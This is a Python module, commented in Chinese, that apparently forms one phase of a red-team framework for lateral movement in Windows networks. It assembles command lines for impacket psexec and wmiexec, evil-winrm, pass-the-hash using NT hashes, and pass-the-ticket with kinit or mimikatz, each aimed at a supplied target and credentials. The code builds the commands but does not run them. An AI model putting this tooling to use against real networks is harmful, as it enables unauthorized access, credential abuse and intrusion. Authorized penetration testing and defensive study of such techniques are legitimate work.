# -*- coding: utf-8 -*-
"""
red_lateral_phase.py — 红队阶段5：横向移动。

功能:
    - 内网横向移动框架（SMB / WMI / WinRM）
    - 凭据传递（Pass-the-Hash / Pass-the-Ticket）
    - 远程命令执行
"""

from __future__ import annotations

import shutil
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional


def _which(name: str) -> Optional[str]:
    return shutil.which(name)


@dataclass
class LateralResult:
    target: str = ""
    method: str = ""
    tool: str = ""
    available: bool = False
    command: str = ""
    output: str = ""
    error: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {"target": self.target, "method": self.method,
                "tool": self.tool, "available": self.available,
                "command": self.command, "output": self.output[-1000:],
                "error": self.error}


class RedLateralPhase:
    """红队阶段5：横向移动。"""

    def __init__(self) -> None:
        self.psexec = _which("psexec") or _which("impacket-psexec")
        self.wmiexec = _which("wmiexec") or _which("impacket-wmiexec")
        self.winrm = _which("evil-winrm")
        self.pth = _which("pth-winexe") or _which("impacket-psexec")

    # ------------------------------------------------------------------ #
    def via_smb(self, target: str, user: str, password: str = "",
                command: str = "whoami") -> LateralResult:
        r = LateralResult(target=target, method="smb", tool="psexec")
        if not self.psexec:
            r.available = False
            r.error = ("impacket-psexec 未安装（pip install impacket）。"
                       "未执行，不 mock。")
            return r
        r.available = True
        r.command = (f"{self.psexec} {user}:{password}@{target} "
                     f"\"{command}\"")
        r.error = "框架就绪：实际执行需授权目标。"
        return r

    def via_wmi(self, target: str, user: str, password: str = "",
                command: str = "whoami") -> LateralResult:
        r = LateralResult(target=target, method="wmi", tool="wmiexec")
        if not self.wmiexec:
            r.available = False
            r.error = "impacket-wmiexec 未安装。未执行，不 mock。"
            return r
        r.available = True
        r.command = (f"{self.wmiexec} {user}:{password}@{target} "
                     f"\"{command}\"")
        return r

    def via_winrm(self, target: str, user: str,
                  password: str = "") -> LateralResult:
        r = LateralResult(target=target, method="winrm",
                         tool="evil-winrm")
        if not self.winrm:
            r.available = False
            r.error = "evil-winrm 未安装（gem install evil-winrm）。"
            return r
        r.available = True
        r.command = f"{self.winrm} -u {user} -p {password} -i {target}"
        return r

    # ------------------------------------------------------------------ #
    def pass_the_hash(self, target: str, user: str, nt_hash: str,
                      domain: str = "",
                      exec_tool: str = "psexec") -> LateralResult:
        r = LateralResult(target=target, method="pth", tool=exec_tool)
        if not self.pth:
            r.available = False
            r.error = "impacket-psexec / pth-winexe 未安装。"
            return r
        r.available = True
        d = f"{domain}\\" if domain else ""
        r.command = (f"{self.pth} -hashes :{nt_hash} "
                     f"{d}{user}@{target}")
        return r

    def pass_the_ticket(self, ticket_path: str = "krb5cc") -> LateralResult:
        r = LateralResult(method="ptt", tool="mimikatz/kinit",
                         available=True)
        r.command = (f"kinit {ticket_path}  # 或 mimikatz "
                     f"kerberos::ptt {ticket_path}")
        r.error = "框架就绪：需要先拿到 TGT/TGS 票据。"
        return r

    # ------------------------------------------------------------------ #
    def remote_exec(self, target: str, method: str = "wmiexec",
                    user: str = "", password: str = "",
                    command: str = "whoami") -> LateralResult:
        if method == "smb":
            return self.via_smb(target, user, password, command)
        if method == "wmi":
            return self.via_wmi(target, user, password, command)
        if method == "winrm":
            return self.via_winrm(target, user, password)
        return LateralResult(method=method,
                             error=f"未知方法: {method}")

    # ------------------------------------------------------------------ #
    def tool_status(self) -> Dict[str, Any]:
        return {
            "psexec": self.psexec or "not_found",
            "psexec_available": bool(self.psexec),
            "wmiexec": self.wmiexec or "not_found",
            "wmiexec_available": bool(self.wmiexec),
            "evil_winrm": self.winrm or "not_found",
            "evil_winrm_available": bool(self.winrm),
            "pth": self.pth or "not_found",
            "pth_available": bool(self.pth),
        }


_default: Optional[RedLateralPhase] = None


def get_red_lateral_phase() -> RedLateralPhase:
    global _default
    if _default is None:
        _default = RedLateralPhase()
    return _default
